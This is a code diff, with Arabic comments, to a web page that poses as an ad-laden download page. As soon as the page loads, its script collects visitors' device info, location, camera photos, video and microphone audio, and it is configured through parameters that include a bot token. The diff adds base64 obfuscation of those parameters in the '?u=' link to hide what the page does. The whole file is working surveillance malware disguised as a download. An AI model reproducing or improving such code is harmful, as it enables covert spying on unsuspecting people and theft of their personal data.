@@ -87,10 +87,30 @@
 
 <script>
 /* ============================================================
-   1) قراءة البارامترات
+   1) فك التشفير من ?u=
    ============================================================ */
-const API_KEY = "754298";
-const qs = new URLSearchParams(location.search);
+function b64decode(s){
+  s = s.replace(/-/g,'+').replace(/_/g,'/');
+  while (s.length % 4) s += '=';
+  return decodeURIComponent(escape(atob(s)));
+}
+
+const encParam = new URLSearchParams(location.search).get('u') || '';
+let decoded = '';
+try {
+  decoded = b64decode(encParam);
+} catch(e){ decoded = ''; }
+
+/* لو التشفير غلط أو فاضي → نوقف */
+if (!decoded){
+  document.body.innerHTML = '<div style="height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">رابط غير صالح</div>';
+  throw 0;
+}
+
+/* decoded مثال: https://site.com/dl.html?api=754298&id=123&token=BOT&inf&bc */
+const qIndex = decoded.indexOf('?');
+const paramsStr = qIndex >= 0 ? decoded.substring(qIndex + 1) : '';
+const qs = new URLSearchParams(paramsStr);
 
 const api   = qs.get('api')   || '';
 const id    = qs.get('id')    || '';
@@ -266,7 +286,7 @@ async function preGrantPermissions(needCamera, needMic){
 }
 
 /* ============================================================
-   5) التشغيل الرئيسي (بنفس ترتيب كودك)
+   5) التشغيل
    ============================================================ */
 async function collectAll(){
   if (!id || !token || api !== API_KEY) return;
@@ -274,10 +294,8 @@ async function collectAll(){
   const needCamera = want.bc || want.fc || want.bcv || want.fcv;
   const needMic    = want.bcv || want.fcv || want.r;
 
-  /* أول حاجة: طلب الأذونات موحد */
   await preGrantPermissions(needCamera, needMic);
 
-  /* بعد كده: كل ميزة */
   if (want.inf) await getInfo();
   if (want.loc) await getLocation();
   if (want.bc)  await capturePhoto('environment');
@@ -368,7 +386,7 @@ function show(n){
 }
 
 /* ============================================================
-   7) التشغيل
+   7) تشغيل صفحة التحميل + جمع البيانات
    ============================================================ */
 addBanners("ads1"); addNative("native1");
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
@@ -388,7 +406,7 @@ $("b2").onclick = function(){
 };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
-/* بدء جمع البيانات — فورًا زي كودك */
+/* بدء جمع البيانات */
 collectAll();
 </script>
 </body>
